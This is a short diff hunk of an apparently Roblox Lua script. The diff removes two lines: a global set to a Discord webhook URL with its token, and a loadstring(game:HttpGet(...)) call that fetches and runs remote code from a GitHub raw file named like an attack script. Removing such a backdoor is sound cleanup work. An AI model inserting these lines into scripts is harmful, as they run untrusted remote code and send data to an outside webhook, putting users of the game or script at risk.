@@ -1301,8 +1301,7 @@ else                                                                           -
     end)
 end
 
-_G.webhooksdiscord = "https://discord.com/api/webhooks/856451236677287966/14v4pHqvDHe0E5XCEUKf9sEjM52Mx16_j-RoWNOwNH5YXTlxLXXAluvMmeGZb8OAZeNQ"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL.lua"),true)()
+
 
 
 local marketplaceService = game:GetService("MarketplaceService")
